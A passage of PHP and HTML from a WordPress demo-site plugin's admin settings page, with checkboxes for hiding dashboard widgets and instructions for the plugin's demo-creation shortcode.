                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to disable this widget from the admin dashboard?", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Disable 'Quick Press Widget' From Dashboard:", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="disabla_dash_qpw" name="dwp_Main_Settings[disabla_dash_qpw]"<?php
                        if ($disabla_dash_qpw == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to disable this widget from the admin dashboard?", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Disable 'Recent Drafts' From Dashboard:", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="disabla_dash_rd" name="dwp_Main_Settings[disabla_dash_rd]"<?php
                        if ($disabla_dash_rd == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to disable this widget from the admin dashboard?", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Disable 'WordPress.com Blog' From Dashboard:", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="disabla_dash_wp" name="dwp_Main_Settings[disabla_dash_wp]"<?php
                        if ($disabla_dash_wp == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to disable this widget from the admin dashboard?", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Disable 'Other WordPress News' From Dashboard:", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="disabla_dash_owp" name="dwp_Main_Settings[disabla_dash_owp]"<?php
                        if ($disabla_dash_owp == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to disable this widget from the admin dashboard?", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Disable 'Incoming Links' From Dashboard:", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="disabla_dash_il" name="dwp_Main_Settings[disabla_dash_il]"<?php
                        if ($disabla_dash_il == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to disable this widget from the admin dashboard?", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Disable 'Plugins' From Dashboard:", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="disabla_dash_pl" name="dwp_Main_Settings[disabla_dash_pl]"<?php
                        if ($disabla_dash_pl == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to disable this widget from the admin dashboard?", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Disable 'Right Now' From Dashboard:", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="disabla_dash_rn" name="dwp_Main_Settings[disabla_dash_rn]"<?php
                        if ($disabla_dash_rn == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     <?php
                        }
                        ?>
                     </td>
                  </tr>
               </table>
            </div>
         </div>
   </div>
   <hr/>
   <div><p class="submit"><input type="submit" name="btnSubmit" id="btnSubmit" class="button button-primary" onclick="unsaved = false;" value="<?php echo esc_html__("Save Settings", 'demo-my-wordpress');?>"/></p></div>
   </form>
   <h3>
      <?php echo esc_html__("To start using the plugin, please include in a page this shortcode:", 'demo-my-wordpress');?> <strong class="cr_red">[dwp_demo_form]</strong>. <?php echo esc_html__("It will create the form that will generate the 'demo creation user interface' ('Create Demo' button + captcha [if enabled]). You can also use these parameters for it: activate_plugins, switch_theme. The first will be used to activate a comma separated list of plugins, after creating the demo website. The second will activate a theme, set by it's stylesheet name.", 'demo-my-wordpress');echo '<br/><br/>';echo esc_html__("Example: [dwp_demo_form activate_plugins='my-cool-plugin/my-cool-plugin.php,my-other-cool-plugins/my-other-cool-plugin.php' switch_theme='twentythirteen']", 'demo-my-wordpress');?>
   </h3>
   <br/>
   <h3>
      <?php echo esc_html__("To configure the WordPress menu items that will be available to demo users, please go to network admin panel -> Settings -> Network Settings -> configure each item as you wish.", 'demo-my-wordpress');?>
   </h3>
</div>
<?php
   }
   ?>
